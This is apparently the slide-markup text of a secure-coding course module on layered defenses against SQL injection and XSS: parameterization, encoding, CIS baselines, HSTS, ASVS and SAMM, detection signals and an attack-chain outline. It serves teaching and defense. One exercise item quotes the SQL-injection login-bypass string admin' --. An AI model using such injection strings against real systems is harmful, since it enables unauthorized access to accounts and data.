              <a:t> Developers must actively opt out to reintroduce risk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Named escape hatches:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> React's dangerouslySetInnerHTML makes the unsafe path visibly deliberate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this matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The unsafe path becomes an easy accidental default only when a developer bypasses it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 lesson:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Naming the dangerous function loudly is itself a security control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Layer 3: Parameterization as an Enforced Standard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Organizational enforcement:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Code review gates and SAST rules flag any direct string concatenation into a database execute() call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nuance:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The pattern itself is treated as the defect, regardless of whether the specific input appears attacker-controlled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'appears safe' isn't good enough:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Input sources change over time; a pattern that's safe today may not be tomorrow</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standard:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Parameterized queries as a non-negotiable architectural requirement, not a per-case judgment call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This shifts SQLi prevention from individual developer vigilance to systemic, automated enforcement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Layer 4: Configuration Baselines and HSTS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Baseline provisioning:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Systems provisioned from a hardened configuration baseline (e.g., CIS Benchmarks)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Baseline actions:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Disables unused services, removes default credentials, enforces least-privilege permissions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Fail-closed default:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Systems fail closed on ambiguous authorization decisions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HSTS:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> HTTP Strict Transport Security forces browsers to only ever connect over HTTPS, even if a link is typed as http://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Applies to:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Any application handling authentication or sensitive data should enable HSTS by default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5.5.4.b.1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Compliance-Driven Verification: ASVS and SAMM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ASVS:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A structured checklist of security requirements/verification tests across three levels of rigor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ASVS categories:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> 14 categories including V5 (Validation, Sanitization, Encoding) and V9 (Communications)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OWASP SAMM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Assesses the MATURITY of an organization's overall software security program</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distinction:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> ASVS audits a specific application; SAMM assesses organizational program maturity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Purpose:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Give organizations a structured way to measure and mature SDLC practices over time, not a one-time certification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5.5.4.b.2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Layered Answer: Architectural, Procedural, Runtime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1, Architectural:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Parameterized queries or context-aware output encoding, eliminates the vulnerability class structurally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 Procedural:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> SAST/DAST gates in the SDLC that catch violations before release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 Runtime:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> CSP, WAF, and secure default configuration that reduce impact if the first two layers fail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exam trap:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A single-layer answer ('just sanitize input') will not earn full credit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layering is graded:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Reflects real defense-in-depth, matching how mature organizations actually structure controls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5.5.4.b.3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Glossary Check-In: Hardening Frameworks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Server-side enforcement:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> All validation must run server-side; client-side checks are UX only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Secure-by-default encoding:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Modern frameworks encode automatically; opt-outs are named loudly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Parameterization as standard:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Enforced categorically via SAST/code review, not judged case by case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ASVS vs. SAMM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Application-level checklist vs. organization-level maturity model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layered answer:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Architectural + procedural + runtime controls together, never just one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Detection Signals for Application-Layer Attacks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Detection Signals for Application-Layer Attacks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SQLi detection signal:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Malformed payloads throw parser exceptions, logged as SQL syntax errors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XSS detection signal:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> WAF/CSP violation reports and anomalous script-source domains in access logs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Patch-gap detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Asset inventory drift, servers running known-vulnerable framework versions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CSP reporting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The report-uri/report-to directive sends violation reports even in enforcement mode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complements prevention:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Prevention blocks the exploit; detection catches what prevention missed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Diagnose the Missing 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A:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A login form is vulnerable to admin' -- bypass despite server-side length checks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B:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A comment field renders an injected script for every subsequent visitor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C:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A patched framework CVE remained exploitable in production for two months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D:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A tampered first-party script exfiltrated data to an unlisted domain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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Identify the missing control and its category (architectural/procedural/runtime) for each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5.5.5.b.1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Web Application Attack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1, Reconnaissance:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Attacker probes for input reflection points, outdated framework versions, missing headers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2, Weaponization:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Craft a payload matched to the discovered gap (SQLi string, XSS script, RCE header)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3, Delivery/Exploitation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Submit the payload through the unmediated trust-boundary crossing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4, Execution:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Data becomes code, the database runs it, the browser executes it, the OS runs it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Stage 5, Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Auth bypass, session hijack, data exfiltration, full compromise (Equifax, British Airways)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5.5   ·   5.5.5.b.2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Topic 5.5</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name the SDLC gate order and match an activity (threat modeling, SAST, code review) to its correct phase?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why allowlisting beats denylisting and why canonicalization order matters?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write the correct remediation for a concatenated SQL query vs. an unencoded HTML reflection?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distinguish what CSP restricts (origins) from what SRI verifies (integrity)?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answer 'how do we prevent X' in three layers, architectural, procedural, runtime, every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